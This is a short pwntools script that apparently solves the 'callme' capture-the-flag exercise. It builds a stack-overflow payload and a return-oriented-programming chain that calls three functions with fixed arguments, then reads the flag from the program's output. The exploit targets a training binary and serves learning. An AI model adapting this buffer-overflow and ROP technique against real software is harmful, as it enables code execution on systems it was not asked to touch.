#/usr/bin/python3
from pwn import process, p64, log

shell = process("./callme")

offset = 40
junk = b"A" * offset

pop3ret = p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret;
ret = p64(0x4006be)     # ret;

callme1 = p64(0x400720)
callme2 = p64(0x400740)
callme3 = p64(0x4006f0)

arguments  = b""
arguments += p64(0xdeadbeefdeadbeef)
arguments += p64(0xcafebabecafebabe)
arguments += p64(0xd00df00dd00df00d)

payload  = b""
payload += junk
payload += pop3ret + arguments + ret + callme1
payload += pop3ret + arguments + ret + callme2
payload += pop3ret + arguments + ret + callme3

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
